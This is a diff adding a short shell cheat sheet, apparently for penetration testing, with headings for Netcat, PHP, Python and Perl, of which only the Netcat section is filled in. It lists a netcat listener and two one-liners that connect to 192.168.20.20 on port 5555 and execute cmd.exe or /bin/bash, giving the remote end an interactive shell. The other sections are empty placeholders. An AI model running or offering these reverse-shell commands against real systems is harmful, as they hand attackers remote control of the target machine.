@@ -1,0 +1,11 @@
+# Netcat
+nc -nvlp 5555
+nc -nv 192.168.20.20 5555 -e cmd.exe # windows 
+nc -nv 192.168.20.20 5555 -e /bin/bash # *nix
+
+# PHP
+
+
+# Python
+
+# Perl
